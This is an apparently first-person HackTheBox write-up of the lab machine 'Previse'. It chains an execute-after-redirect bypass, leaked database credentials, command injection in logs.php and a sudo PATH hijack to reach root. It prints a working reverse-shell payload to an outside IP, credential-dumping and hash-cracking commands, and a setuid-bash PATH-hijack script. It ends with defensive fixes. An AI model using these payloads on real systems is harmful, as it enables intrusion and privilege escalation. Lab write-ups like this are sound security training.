---
title: "Previse"
date: 2021-08-09
type: docs
tags:
  - htb
  - linux
  - easy
  - broken-access-control
  - exec-after-redirect
  - command-injection
  - php
  - hashcat
  - sudo
  - path-hijack
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Easy, **Released:** 2021-08-09, **IP:** `10.10.11.104` , `previse.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. PHP site. Every page redirects to `login.php`, but the pages **render their body before sending the redirect** (execute-after-redirect). Intercept `accounts.php`, drop the `302`, and create an account.
2. Logged in, `files.php` offers a **site backup** (`siteBackup.zip`). `config.php` inside it leaks the MySQL root password `mySQL_p@ssw0rd!:)`.
3. `logs.php` puts the `delim` POST field straight into `exec("/usr/bin/python /opt/scripts/log_process.py {delim}")`. **Command injection** gives a shell as `www-data`.
4. Log into MySQL, dump `accounts`, crack `m4lwhere`'s MD5crypt hash, and SSH in.
5. `m4lwhere` may `sudo /opt/scripts/access_backup.sh`, which calls `gzip` and `date` with no absolute path. **PATH hijack** gives root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `config.php` (MySQL root) | `mySQL_p@ssw0rd!:)` |
| `m4lwhere` (cracked from `accounts`) | `ilovecody112235!` |
| `user.txt` | `/home/m4lwhere/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

When I started poking at Previse, I quickly realized it wasn't going to hinge on one flashy vulnerability, it was going to be three separate, well-known bug classes chained cleanly one after another. My first real break came from **execute-after-redirect (EAR)**, sometimes called a "silent redirect": the application does all of its work server-side and renders the full page body, and only then tacks on a `Location:` header telling the browser to go elsewhere. Because the sensitive content is already sitting in the response before the redirect is issued, all I had to do was intercept the response in Burp and either strip the `302` or replay the request that generated it. That got me an authenticated foothold without ever touching a password.

From there, the box rewarded methodical source review over blind guessing. Once logged in, I found a **site backup** sitting behind an authenticated file download, and pulling it apart handed me the full PHP source tree along with a hardcoded MySQL root password in `config.php`. Reading through the rest of that source paid off again: `logs.php` builds a shell command by concatenating a POST parameter directly into `exec()`, which is about as textbook a **command injection** as you will find, and it gave me a shell as `www-data`. Escalating from there to `m4lwhere` meant dumping the `accounts` table with the leaked root password and cracking an MD5crypt hash offline. The final step to root was a `sudo`-permitted script that called `gzip` and `date` by name instead of by absolute path, classic **`PATH` hijack** territory, and once I confirmed `sudo` was not sanitising `PATH`, planting a malicious `gzip` ahead of the real one in my search path was enough to get a root shell.

Previse is ultimately a "read the source, then abuse what you read" box, and it is a genuinely good one for practising response interception in Burp, since the EAR bug is invisible unless you are actually watching what the server sends back rather than trusting the redirect.

Related broken-access-control boxes: [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Dog](/writeups/hackthebox/linux/easy/dog/). Related command injection: [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/), [Headless](/writeups/hackthebox/linux/medium/headless/). Related PATH hijack privesc: [Magic](/writeups/hackthebox/linux/medium/magic/), [Lookup](/writeups/tryhackme/linux/easy/lookup/), [Plotted-TMS-v3](/writeups/tryhackme/linux/easy/plotted-tms-v3/).

---

## Full Walkthrough

### Enumeration

```console
Open 10.129.174.120:22
Open 10.129.174.120:80
```

```console
[15:09:20] 302 -    3KB - /index.php  ->  login.php
[15:09:21] 200 -    0B  - /config.php
[15:09:21] 200 -    1KB - /nav.php
[15:09:40] 302 -    4KB - /accounts.php  ->  login.php
[15:09:40] 302 -    5KB - /files.php  ->  login.php
```

Two things immediately caught my eye in the scan output. `/nav.php` returned a `200` with a full navigation menu, listing accounts, files, and logs, which told me these were real authenticated features I had not unlocked yet. More interesting was `/accounts.php`: it redirected with a `302`, but the response carried a **4 KB body**, and a redirect that heavy is the classic tell for execute-after-redirect, so I made a mental note to come back to it. Sure enough, visiting `/nav.php` directly showed me the menu a logged-in user would see, complete with links for accounts, home, and files, which confirmed authorization was not being checked consistently across the site.

### Create an account (execute-after-redirect)

I intercepted the response for the accounts page in Burp, changed the status line from `302` to `200 OK`, and forwarded it through. Sure enough, the full "add account" form rendered in the browser. From there it was just a matter of submitting the form to register a new user.

<div class="callout callout-note">

**Execute-after-redirect / silent redirect**

My read on the underlying bug here is that `accounts.php` does check for a valid session, but the check only ever decides whether to queue up a redirect, it never stops the script from continuing to execute. So whether or not I was logged in, the rest of the page still ran: the form rendered, and on a POST request the account creation logic still fired, and only after all of that did the script call `header("Location: login.php")`. PHP keeps executing after a `header()` call unless the code explicitly calls `exit;` or `die();` right afterward, and here it did not. That meant I had two ways in: drop the `302` in Burp and let the body render, or skip the redirect-triggering request entirely and fire the account-creation `POST` directly. I went with the second approach since it was more reliable than fighting Burp's response interception on every request. The `200` I saw on `/nav.php` earlier was really the giveaway that authorization here was inconsistent across pages, and once I saw that pattern I knew to keep pushing on the other endpoints.

</div>

With the new account created, I logged in and started exploring what an authenticated user could actually see.

### Site backup, source and DB creds

Once inside, the files tab offered a full site backup for download. Grabbing `siteBackup.zip` and extracting it gave me the entire PHP source tree, and `config.php` inside it was sitting on a hardcoded database credential:

```php
function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}
```

Reading through the rest of the source with the credentials fresh in my head, I found the real prize in `logs.php`:

```php
// I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```

### Command injection to www-data

The application's "Log Data" download feature works by POSTing a `delim` parameter, either `comma` or `space`, straight into that `exec()` call I had just found. Since I already knew the value went unsanitised into a shell command, my next move was obvious: swap the delimiter for a payload that would break out into a reverse shell.

```http
POST /logs.php HTTP/1.1
Host: previse.htb
Cookie: PHPSESSID=<your session>
Content-Type: application/x-www-form-urlencoded

delim=comma;+bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/9001+0>%261'
```

<div class="callout callout-note">

**Why the semicolon works**

The reason this works comes down to how PHP's `exec()` actually executes: it hands the whole string to `/bin/sh -c`, so any shell metacharacters I put in the input are live, not just data. That means `delim=comma; <command>` first runs the log-processing script harmlessly with `comma` as the delimiter, then executes whatever I appended after the semicolon as a second, independent command. What made this particularly easy to work with is that the endpoint echoes `$output` straight back in the response, so I did not even need a fully interactive shell to confirm the injection, a quick `; id` would have reflected the result inline. Since I wanted a proper shell rather than one-off command execution, I set up a listener first and then fired the bash reverse shell payload, catching the connection back as `www-data`.

</div>

### www-data to m4lwhere

With a foothold as `www-data` and the database password already in hand from `config.php`, the obvious next move was to dump the `accounts` table directly rather than dig through the application for a login form:

```bash
mysql -u root -p'mySQL_p@ssw0rd!:)' previse -e "SELECT username,password FROM accounts"
```

```console
+----------+------------------------------------+
| m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. |
+----------+------------------------------------+
```

The hash prefix `$1$` told me immediately this was **MD5crypt**, which meant hashcat mode `500` was the right tool for the job, so I fed it straight into a `rockyou.txt` run:

```bash
hashcat -m 500 m4lwhere.hash /usr/share/wordlists/rockyou.txt
# -> ilovecody112235!
ssh m4lwhere@previse.htb
```

### Privilege Escalation, PATH hijack

Once I had a stable session as `m4lwhere`, checking my sudo privileges was the natural first move:

```console
m4lwhere@previse:~$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

The script itself is short, and reading it made the vulnerability jump straight out at me:

```bash
#!/bin/bash
gzip -c /var/www/file_access.log > /var/backups/$(date +%F)_file_access.gz
gzip -c /var/www/file_server.log > /var/backups/$(date +%F)_file_server.gz
```

<div class="callout callout-note">

**Relative binary name in a root script**

The vulnerability here is that `access_backup.sh` invokes `gzip` and `date` by their bare names instead of absolute paths like `/bin/gzip`, and critically, `sudo` on this box is not configured with a `secure_path` that would normally lock `PATH` down to trusted directories for privileged commands. That combination meant I could prepend a directory I controlled to my own `PATH`, drop a malicious binary named `gzip` into it, and then invoke the sudo-permitted script. Because the script does not specify where to find `gzip`, the shell resolves it by searching `PATH` in order and finds mine first, and since the whole script runs as root via `sudo`, my `gzip` executes with root privileges too.

</div>

With the hijack path clear, executing it was straightforward: write a fake `gzip` that copies `bash` to a new binary and sets the setuid bit on it, make it executable, prepend `/tmp` to `PATH` for just this one invocation, and run the sudo script.

```bash
cd /tmp
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n' > gzip
chmod +x gzip
sudo PATH=/tmp:$PATH /opt/scripts/access_backup.sh
/tmp/rootbash -p
# id -> euid=0
cat /root/root.txt
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/m4lwhere/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **A redirect header is not access control unless you stop execution right after it.** This box drove home for me that `header("Location: ...")` is just a suggestion to the client, PHP keeps running the rest of the script unless you immediately follow it with `exit;` or `die();`. Any developer relying on a redirect alone to gate a page is one intercepted response away from full disclosure, which is exactly what happened here.
- **Backup archives have no business living inside the web root.** `siteBackup.zip` handed me the entire PHP source tree and a live database credential in one download. If I take one habit from this box into my own reviews, it is to always check for backup files, `.zip`, `.tar.gz`, `.bak`, `.old`, sitting next to the application, since developers reliably forget these are reachable over HTTP.
- **Never build a shell command by concatenating user input into it.** The fix here is not complicated: `escapeshellarg()` around the parameter would have neutralised this immediately, and a stronger fix still would have been to whitelist the `delim` value against a small fixed set of accepted strings rather than trusting user input to reach a shell at all.
- **Privileged scripts should always reference binaries by absolute path.** Calling `gzip` and `date` by name instead of `/bin/gzip` and `/bin/date` is what let me hijack execution here, and it is a pattern I now specifically look for whenever `sudo -l` output comes back during an engagement.
- **Lock `PATH` down in sudoers with `Defaults secure_path`**, and never let `env_keep` pass `PATH` through to a privileged script. Combined with absolute paths inside the script itself, this closes off the PATH hijack technique entirely, since `sudo` would ignore whatever `PATH` the invoking user had set.

---

## Related Writeups

- **Broken access control / auth bypass:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Dog](/writeups/hackthebox/linux/easy/dog/)
- **Command injection via unsanitised parameter:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/), [Headless](/writeups/hackthebox/linux/medium/headless/)
- **PATH hijack on a `sudo` script:** [Magic](/writeups/hackthebox/linux/medium/magic/), [Lookup](/writeups/tryhackme/linux/easy/lookup/), [Plotted-TMS-v3](/writeups/tryhackme/linux/easy/plotted-tms-v3/)
- **Source + creds from a backup archive:** [Previse](/writeups/hackthebox/linux/easy/previse/), see also [Cat](/writeups/hackthebox/linux/medium/cat/) / [Blocky](/writeups/hackthebox/linux/easy/blocky/)

## References

- CWE-698 Execution After Redirect <https://cwe.mitre.org/data/definitions/698.html>
- GTFOBins on PATH abuse <https://gtfobins.github.io/>
- hashcat example hashes <https://hashcat.net/wiki/doku.php?id=example_hashes>
